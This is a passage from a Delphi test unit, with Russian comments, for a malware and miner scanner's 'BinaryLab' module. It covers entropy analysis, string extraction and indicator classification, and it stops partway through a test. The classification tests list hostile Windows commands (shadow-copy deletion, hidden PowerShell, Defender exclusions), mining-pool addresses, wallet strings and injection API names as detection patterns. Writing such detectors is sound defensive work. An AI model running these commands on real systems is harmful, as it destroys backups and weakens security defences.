unit MineHunter.Tests.BinaryLab.Content;

{
  BinaryLab: содержимое файла — энтропия по блокам и области высокой
  энтропии, строки (ASCII, UTF-16, категории-индикаторы) и вложенные
  объекты (исполняемые файлы, архивы, документы, фрагменты сценариев).
}

interface

uses
  DUnitX.TestFramework,
  System.SysUtils,
  MineHunter.BinaryLab.Types, MineHunter.BinaryLab.Source;

type
  [TestFixture]
  [Category('BinaryLab')]
  TBinaryLabEntropyTests = class
  public
    [Test] procedure Entropy_EmptyAndNilSource;
    [Test] procedure Entropy_TinyFile;
    [Test] procedure Entropy_AutoBlockSize;
    [Test] procedure Entropy_ExplicitBlockSize_LastPartialBlock;
    [Test] procedure Entropy_AllZero_NoHighRegions;
    [Test] procedure Entropy_Random_OneHighRegion;
    [Test] procedure Entropy_MixedData_RegionBoundariesAndLocation;
    [Test] procedure Entropy_BlocksAcrossReadChunks;
    [Test] procedure Entropy_MaxScanBytesRespected;
    [Test] procedure Entropy_Cancel_Raises;
    [Test] procedure RangeEntropy_BoundsAndClipping;
  end;

  [TestFixture]
  [Category('BinaryLab')]
  TBinaryLabStringsTests = class
  public
    [Test] procedure Strings_EmptyAndNilSource;
    [Test] procedure Strings_AsciiUtf16AndCyrillic;
    [Test] procedure Strings_ChunkBoundary_FoundOnce;
    [Test] procedure Strings_MinLengthBoundary;
    [Test] procedure Strings_TruncatedToMaxLength;
    [Test] procedure Strings_MaxStrings_KeepsCategorized;
    [Test] procedure Strings_MaxStringsZero;
    [Test] procedure Strings_MaxScanBytesRespected;
    [Test] procedure Strings_Cancel_Raises;
    [Test] procedure Classify_Mining;
    [Test] procedure Classify_Wallet;
    [Test] procedure Classify_UrlAndEmail;
    [Test] procedure Classify_Ip;
    [Test] procedure Classify_RegistryAndCommand;
    [Test] procedure Classify_SuspiciousApi;
    [Test] procedure Classify_Path;
    [Test] procedure Classify_Domain;
    [Test] procedure Classify_Base64AndPlain;
  end;

  [TestFixture]
  [Category('BinaryLab')]
  TBinaryLabEmbeddedTests = class
  public
    [Test] procedure Embedded_PeInsideData;
    [Test] procedure Embedded_ArchivesAndDocuments;
    [Test] procedure Embedded_RandomData_NoFalsePositives;
    [Test] procedure Embedded_WeakSignaturesInText_Ignored;
    [Test] procedure Embedded_OffsetZero_NotReported;
    [Test] procedure Embedded_NestedObjectSkipped;
    [Test] procedure Embedded_BogusSize_DoesNotHideRest;
    [Test] procedure Embedded_MaxEmbeddedLimit;
    [Test] procedure Embedded_ScriptFragments_AndWindow;
    [Test] procedure Embedded_ChunkBoundaries;
    [Test] procedure Embedded_LocateAndMaxScanBytes;
    [Test] procedure Embedded_Cancel_Raises;
  end;

implementation

uses
  System.Math,
  MineHunter.BinaryLab.Entropy, MineHunter.BinaryLab.Strings, MineHunter.BinaryLab.Embedded,
  MineHunter.Tests.PeBuilder;

const
  MB = 1024 * 1024;

function Src(const AData: TBytes): IMHBinarySource;
begin
  Result := TMHBytesSource.Create(AData);
end;

function Options: TMHBinaryLabOptions;
begin
  Result := TMHBinaryLabOptions.Default;
end;

function Zeros(ACount: Integer): TBytes;
begin
  SetLength(Result, ACount);
  if ACount > 0 then
    FillChar(Result[0], ACount, 0);
end;

/// Записывает APart в AData по смещению AOffset (данные теста заранее нужного размера).
procedure Put(var AData: TBytes; AOffset: Integer; const APart: TBytes);
begin
  if Length(APart) > 0 then
    Move(APart[0], AData[AOffset], Length(APart));
end;

function LocateText(AOffset: Int64): string;
begin
  Result := 'смещение ' + IntToStr(AOffset);
end;

{ TBinaryLabEntropyTests }

procedure TBinaryLabEntropyTests.Entropy_EmptyAndNilSource;
var
  LInfo: TMHEntropyInfo;
  I: Integer;
begin
  LInfo := MHAnalyzeEntropy(Src(nil), Options, nil, nil);
  Assert.AreEqual(256, LInfo.BlockSize, 'Размер блока задан и для пустого файла');
  Assert.AreEqual(0, Integer(Length(LInfo.Blocks)));
  Assert.AreEqual(0, Integer(Length(LInfo.HighRegions)));
  Assert.AreEqual<Int64>(0, LInfo.BytesScanned);
  Assert.AreEqual(0.0, LInfo.Overall);
  for I := 0 to 255 do
    Assert.AreEqual<Int64>(0, LInfo.Histogram[I]);
  LInfo := MHAnalyzeEntropy(nil, Options, nil, nil);
  Assert.AreEqual(0, Integer(Length(LInfo.Blocks)), 'Источник nil — пустой результат');
end;

procedure TBinaryLabEntropyTests.Entropy_TinyFile;
var
  LInfo: TMHEntropyInfo;
  I: Integer;
  LSum: Int64;
begin
  LInfo := MHAnalyzeEntropy(Src(TestBytes([1, 2, 3, 4, 5, 6, 7, 8, 9, 10])), Options, nil, nil);
  Assert.AreEqual(1, Integer(Length(LInfo.Blocks)));
  Assert.AreEqual<Int64>(0, LInfo.Blocks[0].Offset);
  Assert.AreEqual(10, LInfo.Blocks[0].Size, 'Блок короче размера блока');
  Assert.AreEqual(Log2(Double(10)), Double(LInfo.Blocks[0].Entropy), 1e-5);
  Assert.AreEqual(Log2(Double(10)), LInfo.Overall, 1e-9);
  Assert.AreEqual<Int64>(10, LInfo.BytesScanned);
  LSum := 0;
  for I := 0 to 255 do
    Inc(LSum, LInfo.Histogram[I]);
  Assert.AreEqual<Int64>(10, LSum, 'Гистограмма — все прочитанные байты');
  Assert.AreEqual<Int64>(1, LInfo.Histogram[7]);
  Assert.AreEqual(0, Integer(Length(LInfo.HighRegions)), 'Область меньше 512 байт не показывается');
end;

procedure TBinaryLabEntropyTests.Entropy_AutoBlockSize;
var
  LOptions: TMHBinaryLabOptions;
  LInfo: TMHEntropyInfo;
begin
  LOptions := Options;
  LInfo := MHAnalyzeEntropy(Src(Zeros(MB)), LOptions, nil, nil);
  Assert.AreEqual(256, LInfo.BlockSize, '1 МБ / 4096 блоков = 256');
  Assert.AreEqual(4096, Integer(Length(LInfo.Blocks)));
  LInfo := MHAnalyzeEntropy(Src(Zeros(MB + 1)), LOptions, nil, nil);
  Assert.AreEqual(512, LInfo.BlockSize, 'Чуть больше — следующая степень двойки');
  Assert.IsTrue(Length(LInfo.Blocks) <= LOptions.MaxEntropyBlocks);
  Assert.AreEqual(1, LInfo.Blocks[High(LInfo.Blocks)].Size, 'Последний неполный блок');
  LOptions.MaxEntropyBlocks := 16;
  LInfo := MHAnalyzeEntropy(Src(Zeros(MB)), LOptions, nil, nil);
  Assert.AreEqual(65536, LInfo.BlockSize);
  Assert.AreEqual(16, Integer(Length(LInfo.Blocks)));
  LInfo := MHAnalyzeEntropy(Src(Zeros(1000)), Options, nil, nil);
  Assert.AreEqual(256, LInfo.BlockSize, 'Не меньше 256 байт');
  Assert.AreEqual(4, Integer(Length(LInfo.Blocks)));
end;

procedure TBinaryLabEntropyTests.Entropy_ExplicitBlockSize_LastPartialBlock;
var
  LOptions: TMHBinaryLabOptions;
  LInfo: TMHEntropyInfo;
  I: Integer;
begin
  LOptions := Options;
  LOptions.EntropyBlockSize := 300;
  LInfo := MHAnalyzeEntropy(Src(TestRandomBytes(1000)), LOptions, nil, nil);
  Assert.AreEqual(300, LInfo.BlockSize);
  Assert.AreEqual(4, Integer(Length(LInfo.Blocks)));
  for I := 0 to 3 do
    Assert.AreEqual<Int64>(I * 300, LInfo.Blocks[I].Offset);
  Assert.AreEqual(300, LInfo.Blocks[2].Size);
  Assert.AreEqual(100, LInfo.Blocks[3].Size, 'Последний блок короче');
  // Слишком маленький размер блока нормализуется до 64.
  LOptions.EntropyBlockSize := 10;
  LInfo := MHAnalyzeEntropy(Src(TestRandomBytes(1000)), LOptions, nil, nil);
  Assert.AreEqual(64, LInfo.BlockSize);
  Assert.AreEqual(16, Integer(Length(LInfo.Blocks)));
end;

procedure TBinaryLabEntropyTests.Entropy_AllZero_NoHighRegions;
var
  LInfo: TMHEntropyInfo;
  LBlock: TMHEntropyBlock;
begin
  LInfo := MHAnalyzeEntropy(Src(Zeros(65536)), Options, nil, nil);
  Assert.AreEqual(0.0, LInfo.Overall, 1e-12);
  Assert.AreEqual<Int64>(65536, LInfo.Histogram[0]);
  for LBlock in LInfo.Blocks do
    Assert.AreEqual(0.0, Double(LBlock.Entropy), 1e-12);
  Assert.AreEqual(0, Integer(Length(LInfo.HighRegions)));
end;

procedure TBinaryLabEntropyTests.Entropy_Random_OneHighRegion;
var
  LInfo: TMHEntropyInfo;
  LOptions: TMHBinaryLabOptions;
begin
  LInfo := MHAnalyzeEntropy(Src(TestRandomBytes(256 * 1024)), Options, nil, nil);
  Assert.IsTrue(LInfo.Overall > 7.99, 'Случайные данные — около 8: ' + FloatToStr(LInfo.Overall));
  Assert.AreEqual(1, Integer(Length(LInfo.HighRegions)), 'Одна область на весь файл');
  Assert.AreEqual<Int64>(0, LInfo.HighRegions[0].Offset);
  Assert.AreEqual<Int64>(256 * 1024, LInfo.HighRegions[0].Size);
  // Блок 256 байт: оценка энтропии по малой выборке занижена (около 7.2).
  Assert.IsTrue(LInfo.HighRegions[0].AverageEntropy >= MH_HIGH_ENTROPY_THRESHOLD,
    FloatToStr(LInfo.HighRegions[0].AverageEntropy));
  Assert.IsTrue(LInfo.HighRegions[0].EntropyClass >= ecCompressed);
  Assert.AreEqual('', LInfo.HighRegions[0].Location, 'Без ALocate место не указывается');
  // Блок 4 КБ — оценка близка к 8, класс «шифрованные».
  LOptions := Options;
  LOptions.EntropyBlockSize := 4096;
  LInfo := MHAnalyzeEntropy(Src(TestRandomBytes(256 * 1024)), LOptions, nil, nil);
  Assert.AreEqual(1, Integer(Length(LInfo.HighRegions)));
  Assert.AreEqual<Int64>(256 * 1024, LInfo.HighRegions[0].Size);
  Assert.IsTrue(LInfo.HighRegions[0].AverageEntropy > 7.9, FloatToStr(LInfo.HighRegions[0].AverageEntropy));
  Assert.AreEqual(Ord(ecEncrypted), Ord(LInfo.HighRegions[0].EntropyClass));
end;

procedure TBinaryLabEntropyTests.Entropy_MixedData_RegionBoundariesAndLocation;
var
  LData: TBytes;
  LOptions: TMHBinaryLabOptions;
  LInfo: TMHEntropyInfo;
begin
  // Нули 8 КБ, случайные 16 КБ, нули 8 КБ, случайные 4 КБ, нули 1 КБ,
  // случайные 300 байт (меньше 512 — не область), нули 2 КБ.
  LData := TestConcat([Zeros(8192), TestRandomBytes(16384, 1), Zeros(8192), TestRandomBytes(4096, 2),
    Zeros(1024), TestRandomBytes(300, 3), Zeros(2048)]);
  LOptions := Options;
  LOptions.EntropyBlockSize := 256;
  LInfo := MHAnalyzeEntropy(Src(LData), LOptions,
    function(AOffset: Int64): string
    begin
      Result := LocateText(AOffset);
    end, nil);
  Assert.AreEqual(2, Integer(Length(LInfo.HighRegions)));
  Assert.AreEqual<Int64>(8192, LInfo.HighRegions[0].Offset);
  Assert.AreEqual<Int64>(16384, LInfo.HighRegions[0].Size);
  Assert.AreEqual<Int64>(8192 + 16384 + 8192, LInfo.HighRegions[1].Offset);
  Assert.AreEqual<Int64>(4096, LInfo.HighRegions[1].Size);
  Assert.AreEqual('смещение 8192', LInfo.HighRegions[0].Location, 'Место — по ALocate');
  Assert.AreEqual('смещение 32768', LInfo.HighRegions[1].Location);
  Assert.IsTrue(LInfo.HighRegions[0].AverageEntropy >= MH_HIGH_ENTROPY_THRESHOLD);
  Assert.IsTrue(LInfo.Overall > 0.5);
  Assert.IsTrue(LInfo.Overall < 7, 'Общая энтропия смешанных данных ниже, чем у случайных');
end;

procedure TBinaryLabEntropyTests.Entropy_BlocksAcrossReadChunks;
var
  LData: TBytes;
  LOptions: TMHBinaryLabOptions;
  LInfo: TMHEntropyInfo;
  I: Integer;
  LNext, LSum: Int64;
  LCrossing: Integer;
begin
  // 3 МБ: блок 3000 байт не делит блок чтения 1 МБ — блоки пересекают границы чтения.
  LData := TestConcat([TestRandomBytes(MB), TestCodeBytes(MB), Zeros(MB)]);
  LOptions := Options;
  LOptions.EntropyBlockSize := 3000;
  LInfo := MHAnalyzeEntropy(Src(LData), LOptions, nil, nil);
  Assert.AreEqual<Int64>(3 * MB, LInfo.BytesScanned);
  Assert.AreEqual(Integer((3 * MB + 2999) div 3000), Integer(Length(LInfo.Blocks)));
  LNext := 0;
  LSum := 0;
  LCrossing := -1;
  for I := 0 to High(LInfo.Blocks) do
  begin
    Assert.AreEqual<Int64>(LNext, LInfo.Blocks[I].Offset, 'Блоки идут подряд');
    if (LInfo.Blocks[I].Offset < MB) and (LInfo.Blocks[I].Offset + LInfo.Blocks[I].Size > MB) then
      LCrossing := I;
    Inc(LNext, LInfo.Blocks[I].Size);
    Inc(LSum, LInfo.Blocks[I].Size);
  end;
  Assert.AreEqual<Int64>(3 * MB, LSum);
  Assert.IsTrue(LCrossing >= 0, 'Есть блок на границе чтения');
  Assert.AreEqual(MHRangeEntropy(Src(LData), LInfo.Blocks[LCrossing].Offset, LInfo.Blocks[LCrossing].Size),
    Double(LInfo.Blocks[LCrossing].Entropy), 1e-5, 'Блок на границе посчитан целиком');
  Assert.AreEqual(1, Integer(Length(LInfo.HighRegions)), 'Высокая энтропия только в первом мегабайте');
  Assert.AreEqual<Int64>(0, LInfo.HighRegions[0].Offset);
  Assert.IsTrue(Abs(LInfo.HighRegions[0].Size - MB) <= 3000, IntToStr(LInfo.HighRegions[0].Size));
end;

procedure TBinaryLabEntropyTests.Entropy_MaxScanBytesRespected;
var
  LOptions: TMHBinaryLabOptions;
  LInfo: TMHEntropyInfo;
  I: Integer;
  LSum: Int64;
begin
  LOptions := Options;
  LOptions.MaxScanBytes := 4096;
  LInfo := MHAnalyzeEntropy(Src(TestRandomBytes(20000)), LOptions, nil, nil);
  Assert.AreEqual<Int64>(4096, LInfo.BytesScanned, 'Прочитано не больше лимита');
  LSum := 0;
  for I := 0 to 255 do
    Inc(LSum, LInfo.Histogram[I]);
  Assert.AreEqual<Int64>(4096, LSum);
  Assert.AreEqual<Int64>(4096, LInfo.Blocks[High(LInfo.Blocks)].Offset + LInfo.Blocks[High(LInfo.Blocks)].Size);
  Assert.AreEqual(16, Integer(Length(LInfo.Blocks)), 'Размер блока подобран по лимиту, а не по файлу');
end;

procedure TBinaryLabEntropyTests.Entropy_Cancel_Raises;
var
  LData: TBytes;
  LCalls: Integer;
begin
  LData := TestRandomBytes(3 * MB);
  LCalls := 0;
  Assert.WillRaise(
    procedure
    begin
      MHAnalyzeEntropy(Src(LData), Options, nil,
        function: Boolean
        begin
          Inc(LCalls);
          Result := LCalls >= 2;
        end);
    end, EMHBinaryLabCancelled);
  Assert.AreEqual(2, LCalls, 'Отмена проверяется перед каждым блоком чтения');
end;

procedure TBinaryLabEntropyTests.RangeEntropy_BoundsAndClipping;
var
  LSource: IMHBinarySource;
begin
  LSource := Src(TestConcat([Zeros(1000), TestRandomBytes(100000), TestBytes([1, 2, 3, 4])]));
  Assert.AreEqual(0.0, MHRangeEntropy(LSource, 0, 1000), 1e-12, 'Нули');
  Assert.IsTrue(MHRangeEntropy(LSource, 1000, 100000) > 7.9, 'Случайные данные');
  Assert.AreEqual(0.0, MHRangeEntropy(LSource, 0, 100000, 1000), 1e-12, 'Лимит AMaxBytes');
  Assert.AreEqual(2.0, MHRangeEntropy(LSource, 101000, 1000000), 1e-9, 'Обрезано по концу файла');
  Assert.AreEqual(-1.0, MHRangeEntropy(LSource, 101004, 10), 'Начало за концом файла');
  Assert.AreEqual(-1.0, MHRangeEntropy(LSource, 5000000, 10), 'Далеко за концом');
  Assert.AreEqual(-1.0, MHRangeEntropy(LSource, -1, 10), 'Отрицательное смещение');
  Assert.AreEqual(-1.0, MHRangeEntropy(LSource, 0, 0), 'Пустой диапазон');
  Assert.AreEqual(-1.0, MHRangeEntropy(LSource, 0, 10, 0), 'Нулевой лимит');
  Assert.AreEqual(-1.0, MHRangeEntropy(Src(nil), 0, 10), 'Пустой источник');
  Assert.AreEqual(-1.0, MHRangeEntropy(nil, 0, 10), 'Источник nil');
end;

{ TBinaryLabStringsTests }

procedure TBinaryLabStringsTests.Strings_EmptyAndNilSource;
var
  LInfo: TMHStringsInfo;
begin
  LInfo := MHScanStrings(Src(nil), Options, nil);
  Assert.AreEqual(0, Integer(Length(LInfo.Items)));
  Assert.AreEqual(0, LInfo.TotalFound);
  Assert.IsFalse(LInfo.Truncated);
  LInfo := MHScanStrings(nil, Options, nil);
  Assert.AreEqual(0, Integer(Length(LInfo.Items)));
  LInfo := MHScanStrings(Src(TestRandomBytes(3)), Options, nil);
  Assert.AreEqual(0, Integer(Length(LInfo.Items)), 'Крошечный файл');
end;

procedure TBinaryLabStringsTests.Strings_AsciiUtf16AndCyrillic;
var
  LData: TBytes;
  LInfo: TMHStringsInfo;
  LCyrOffset, LOddOffset, LWideOffset: Integer;
begin
  // 0: нули; 3: ASCII; 17: UTF-16 (нечётное смещение); затем кириллица UTF-16 с чётного.
  LData := TestConcat([Zeros(3), TestAscii('Hello world'), Zeros(3), TestUtf16('Unicode text'), Zeros(3)]);
  LWideOffset := 17;
  LCyrOffset := Length(LData);
  LData := TestConcat([LData, TestUtf16('Привет мир'), Zeros(4), TestBytes([$90, $91])]);
  LOddOffset := Length(LData);
  LData := TestConcat([LData, TestAscii(#9'tab'#9'text'), Zeros(2)]);
  LInfo := MHScanStrings(Src(LData), Options, nil);
  Assert.AreEqual(4, Integer(Length(LInfo.Items)), 'Без мусора из одиночных символов');
  Assert.AreEqual(4, LInfo.TotalFound);
  Assert.IsFalse(LInfo.Truncated);
  Assert.AreEqual('Hello world', LInfo.Items[0].Text);
  Assert.AreEqual<Int64>(3, LInfo.Items[0].Offset);
  Assert.AreEqual(Ord(seAscii), Ord(LInfo.Items[0].Encoding));
  Assert.AreEqual('Unicode text', LInfo.Items[1].Text);
  Assert.AreEqual<Int64>(LWideOffset, LInfo.Items[1].Offset, 'UTF-16 с нечётного смещения');
  Assert.AreEqual(Ord(seUtf16), Ord(LInfo.Items[1].Encoding));
  Assert.AreEqual('Привет мир', LInfo.Items[2].Text, 'Кириллица UTF-16');
  Assert.AreEqual<Int64>(LCyrOffset, LInfo.Items[2].Offset);
  Assert.AreEqual(Ord(seUtf16), Ord(LInfo.Items[2].Encoding));
  Assert.AreEqual(#9'tab'#9'text', LInfo.Items[3].Text, 'Табуляция — часть строки');
  Assert.AreEqual<Int64>(LOddOffset, LInfo.Items[3].Offset);
  Assert.AreEqual(4, LInfo.CountByCategory[scPlain]);
end;

procedure TBinaryLabStringsTests.Strings_ChunkBoundary_FoundOnce;
const
  ASCII_TEXT = 'BoundaryStringValue';
  WIDE_TEXT = 'WideBoundaryText';
  TAIL_TEXT = 'EndsAtFileEnd';
var
  LData: TBytes;
  LInfo: TMHStringsInfo;
  LAsciiAt, LWideAt, LTailAt: Integer;
begin
  // Блок чтения — 1 МБ: ASCII пересекает первую границу, UTF-16 — вторую, причём
  // кодовая единица разрезана границей (нечётное смещение); последняя строка — у конца файла.
  LData := Zeros(3 * MB);
  LAsciiAt := MB - 7;
  LWideAt := 2 * MB - 5;
  LTailAt := 3 * MB - Length(TAIL_TEXT);
  Put(LData, LAsciiAt, TestAscii(ASCII_TEXT));
  Put(LData, LWideAt, TestUtf16(WIDE_TEXT));
  Put(LData, LTailAt, TestAscii(TAIL_TEXT));
  LInfo := MHScanStrings(Src(LData), Options, nil);
  Assert.AreEqual(3, Integer(Length(LInfo.Items)), 'Каждая строка найдена ровно один раз');
  Assert.AreEqual(ASCII_TEXT, LInfo.Items[0].Text);
  Assert.AreEqual<Int64>(LAsciiAt, LInfo.Items[0].Offset);
  Assert.AreEqual(WIDE_TEXT, LInfo.Items[1].Text);
  Assert.AreEqual<Int64>(LWideAt, LInfo.Items[1].Offset);
  Assert.AreEqual(Ord(seUtf16), Ord(LInfo.Items[1].Encoding));
  Assert.AreEqual(TAIL_TEXT, LInfo.Items[2].Text, 'Строка у конца файла завершается');
  Assert.AreEqual<Int64>(LTailAt, LInfo.Items[2].Offset);
end;

procedure TBinaryLabStringsTests.Strings_MinLengthBoundary;
var
  LData: TBytes;
  LInfo: TMHStringsInfo;
  LOptions: TMHBinaryLabOptions;
begin
  LData := TestConcat([TestAscii('abcd'), Zeros(2), TestAscii('abcde'), Zeros(2), TestUtf16('wxyz'), Zeros(2),
    TestUtf16('vwxyz'), Zeros(2)]);
  LOptions := Options;
  LOptions.MinStringLength := 5;
  LInfo := MHScanStrings(Src(LData), LOptions, nil);
  Assert.AreEqual(2, Integer(Length(LInfo.Items)), 'Длина min-1 не находится, min — находится');
  Assert.AreEqual('abcde', LInfo.Items[0].Text);
  Assert.AreEqual<Int64>(6, LInfo.Items[0].Offset);
  Assert.AreEqual('vwxyz', LInfo.Items[1].Text);
  Assert.AreEqual(Ord(seUtf16), Ord(LInfo.Items[1].Encoding));
  LOptions.MinStringLength := 4;
  Assert.AreEqual(4, Integer(Length(MHScanStrings(Src(LData), LOptions, nil).Items)));
end;

procedure TBinaryLabStringsTests.Strings_TruncatedToMaxLength;
var
  LData: TBytes;
  LInfo: TMHStringsInfo;
  LOptions: TMHBinaryLabOptions;
begin
  LData := TestConcat([Zeros(5), TestAscii(StringOfChar('A', 100)), Zeros(2), TestUtf16(StringOfChar('W', 40)),
    Zeros(2), TestAscii('after'), Zeros(1)]);
  LOptions := Options;
  LOptions.MaxStringLength := 16;
  LInfo := MHScanStrings(Src(LData), LOptions, nil);
  Assert.AreEqual(3, Integer(Length(LInfo.Items)), 'Длинная строка — один элемент');
  Assert.AreEqual(StringOfChar('A', 16), LInfo.Items[0].Text, 'Текст обрезан до MaxStringLength');
  Assert.AreEqual<Int64>(5, LInfo.Items[0].Offset, 'Смещение — начало строки');
  Assert.AreEqual(StringOfChar('W', 16), LInfo.Items[1].Text);
  Assert.AreEqual<Int64>(107, LInfo.Items[1].Offset);
  Assert.AreEqual('after', LInfo.Items[2].Text);
end;

procedure TBinaryLabStringsTests.Strings_MaxStrings_KeepsCategorized;
var
  LParts: TArray<TBytes>;
  LInfo: TMHStringsInfo;
  LOptions: TMHBinaryLabOptions;
  I: Integer;
begin
  for I := 0 to 9 do
    LParts := LParts + [TestAscii(Format('plainstring%.2d', [I])), Zeros(1)];
  LParts := LParts + [TestAscii('http://evil.example.com/a'), Zeros(1), TestAscii('stratum+tcp://pool.example:3333'),
    Zeros(1), TestAscii('C:\Windows\Temp\x.exe'), Zeros(1)];
  LOptions := Options;
  LOptions.MaxStrings := 5;
  LInfo := MHScanStrings(Src(TestConcat(LParts)), LOptions, nil);
  Assert.AreEqual(5, Integer(Length(LInfo.Items)));
  Assert.AreEqual(13, LInfo.TotalFound, 'Найдено всего — с отброшенными');
  Assert.IsTrue(LInfo.Truncated);
  Assert.AreEqual('plainstring00', LInfo.Items[0].Text, 'Обычные — самые ранние');
  Assert.AreEqual('plainstring01', LInfo.Items[1].Text);
  Assert.AreEqual(Ord(scUrl), Ord(LInfo.Items[2].Category), 'Строки с категорией сохранены');
  Assert.AreEqual(Ord(scMining), Ord(LInfo.Items[3].Category));
  Assert.AreEqual(Ord(scPath), Ord(LInfo.Items[4].Category));
  for I := 1 to High(LInfo.Items) do
    Assert.IsTrue(LInfo.Items[I].Offset > LInfo.Items[I - 1].Offset, 'По возрастанию смещения');
  Assert.AreEqual(10, LInfo.CountByCategory[scPlain], 'Счётчики — по всем найденным');
  Assert.AreEqual(1, LInfo.CountByCategory[scUrl]);
  Assert.AreEqual(1, LInfo.CountByCategory[scMining]);
  Assert.AreEqual(1, LInfo.CountByCategory[scPath]);
  // Строк с категорией больше лимита — сохраняются первые из них.
  LOptions.MaxStrings := 2;
  LInfo := MHScanStrings(Src(TestConcat(LParts)), LOptions, nil);
  Assert.AreEqual(2, Integer(Length(LInfo.Items)));
  Assert.AreEqual(Ord(scUrl), Ord(LInfo.Items[0].Category));
  Assert.AreEqual(Ord(scMining), Ord(LInfo.Items[1].Category));
  // Под лимитом — без усечения.
  LOptions.MaxStrings := 13;
  LInfo := MHScanStrings(Src(TestConcat(LParts)), LOptions, nil);
  Assert.AreEqual(13, Integer(Length(LInfo.Items)));
  Assert.IsFalse(LInfo.Truncated);
end;

procedure TBinaryLabStringsTests.Strings_MaxStringsZero;
var
  LOptions: TMHBinaryLabOptions;
  LInfo: TMHStringsInfo;
begin
  LOptions := Options;
  LOptions.MaxStrings := 0;
  LInfo := MHScanStrings(Src(TestConcat([TestAscii('first string'), Zeros(1), TestAscii('https://x.example/')])),
    LOptions, nil);
  Assert.AreEqual(0, Integer(Length(LInfo.Items)));
  Assert.AreEqual(2, LInfo.TotalFound);
  Assert.IsTrue(LInfo.Truncated);
  Assert.AreEqual(1, LInfo.CountByCategory[scUrl]);
end;

procedure TBinaryLabStringsTests.Strings_MaxScanBytesRespected;
var
  LData: TBytes;
  LOptions: TMHBinaryLabOptions;
  LInfo: TMHStringsInfo;
begin
  LData := Zeros(10000);
  Put(LData, 100, TestAscii('inside limit'));
  Put(LData, 4090, TestAscii('crosses limit'));
  Put(LData, 6000, TestAscii('outside limit'));
  LOptions := Options;
  LOptions.MaxScanBytes := 4096;
  LInfo := MHScanStrings(Src(LData), LOptions, nil);
  Assert.AreEqual(2, Integer(Length(LInfo.Items)));
  Assert.AreEqual('inside limit', LInfo.Items[0].Text);
  Assert.AreEqual('crosse', LInfo.Items[1].Text, 'Строка обрезана лимитом чтения');
end;

procedure TBinaryLabStringsTests.Strings_Cancel_Raises;
var
  LData: TBytes;
begin
  LData := Zeros(2 * MB);
  Assert.WillRaise(
    procedure
    begin
      MHScanStrings(Src(LData), Options,
        function: Boolean
        begin
          Result := True;
        end);
    end, EMHBinaryLabCancelled);
end;

procedure CheckCategory(const AText: string; ACategory: TMHStringCategory);
begin
  Assert.AreEqual(MHStringCategoryToName(ACategory), MHStringCategoryToName(MHClassifyString(AText)), AText);
end;

procedure TBinaryLabStringsTests.Classify_Mining;
begin
  CheckCategory('stratum+tcp://xmr.pool.example.com:3333', scMining);
  CheckCategory('XMRig/6.20.0 (Windows NT 10.0)', scMining);
  CheckCategory('--donate-level=1 --threads=4', scMining);
  CheckCategory('pool.supportxmr.com', scMining);
  CheckCategory('-o pool.minexmr.com:4444', scMining);
  CheckCategory('RandomX dataset', scMining);
  // Маркер внутри другого слова — не майнинг (строки установщика Inno Setup).
  CheckCategory('RandomXorStartOffset', scPlain);
  CheckCategory('RandomXorFirstSlice', scPlain);
  CheckCategory('NotXmrigButSomething', scPlain);
end;

procedure TBinaryLabStringsTests.Classify_Wallet;
const
  BASE58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
var
  LMonero: string;
  I: Integer;
begin
  LMonero := '4A';
  for I := 1 to 93 do
    LMonero := LMonero + BASE58[(I * 7) mod Length(BASE58) + 1];
  CheckCategory(LMonero, scWallet);
  CheckCategory('-u ' + LMonero + '.worker1', scWallet);
  CheckCategory('bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq', scWallet);
  CheckCategory('1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa', scWallet);
  CheckCategory('wallet=0x742d35Cc6634C0532925a3b844Bc454e4438f44e', scWallet);
  // Похожие на адрес, но не адрес.
  CheckCategory('3dimensionalobjectrendererpipeline', scPlain);
  CheckCategory(Copy(LMonero, 1, 94), scPlain);
  CheckCategory('0x742d35Cc6634C0532925a3b844Bc454e4438f44', scPlain);
  CheckCategory('bc1BADADDRESSWITHUPPERCASECHARS12345', scPlain);
end;

procedure TBinaryLabStringsTests.Classify_UrlAndEmail;
begin
  CheckCategory('https://example.com/download/payload.bin', scUrl);
  CheckCategory('connect ws://10.1.1.1:81/feed', scUrl);
  CheckCategory('FTP://files.example.org', scUrl);
  CheckCategory('admin@example.org', scEmail);
  CheckCategory('Contact: support.team+bugs@mail.example.co.uk now', scEmail);
  CheckCategory('user@localhost', scPlain);
  CheckCategory('@@@ a@b', scPlain);
end;

procedure TBinaryLabStringsTests.Classify_Ip;
begin
  CheckCategory('192.168.1.10', scIp);
  CheckCategory('45.33.32.156:8080', scIp);
  CheckCategory('connect to 185.10.20.30 now', scIp);
  CheckCategory(' 127.0.0.1 ', scIp);
  // Номера версий — не адреса.
  CheckCategory('10.0.19041.1', scPlain);
  CheckCategory('1.0.0.0', scPlain);
  CheckCategory('2.5.1.3', scPlain);
  CheckCategory('FileVersion 10.2.3.4', scPlain);
  CheckCategory('1.2.3.4.5', scPlain);
  CheckCategory('300.1.1.1', scPlain);
  CheckCategory('v10.20.30.40', scPlain);
end;

procedure TBinaryLabStringsTests.Classify_RegistryAndCommand;
begin
  CheckCategory('HKEY_LOCAL_MACHINE\SYSTEM', scRegistry);
  CheckCategory('HKCU\Environment', scRegistry);
  CheckCategory('Software\Microsoft\Windows\CurrentVersion\Run', scRegistry);
  CheckCategory('cmd.exe /c del /q x', scCommand);
  CheckCategory('powershell -nop -w hidden', scCommand);
  CheckCategory('schtasks /create /tn Updater', scCommand);
  CheckCategory('vssadmin delete shadows /all', scCommand);
  CheckCategory('rundll32 shell32.dll,Control_RunDLL', scCommand);
  CheckCategory('Add-MpPreference -ExclusionPath', scCommand);
  CheckCategory('command line', scPlain);
end;

procedure TBinaryLabStringsTests.Classify_SuspiciousApi;
begin
  CheckCategory('VirtualAllocEx', scSuspiciousApi);
  CheckCategory('writeprocessmemory', scSuspiciousApi);
  CheckCategory('NtUnmapViewOfSection', scSuspiciousApi);
  CheckCategory('SetWindowsHookExW', scSuspiciousApi);
  CheckCategory('URLDownloadToFileA', scSuspiciousApi);
  // Обычные функции и упоминание внутри текста — без категории.
  CheckCategory('VirtualAlloc', scPlain);
  CheckCategory('ResumeThread', scPlain);
  CheckCategory('OpenProcess', scPlain);
  CheckCategory('Call VirtualAllocEx now', scPlain);
end;

procedure TBinaryLabStringsTests.Classify_Path;
begin
  CheckCategory('C:\Windows\System32\drivers', scPath);
  CheckCategory('open d:\temp\a.txt', scPath);
  CheckCategory('\\server\share\file.dat', scPath);
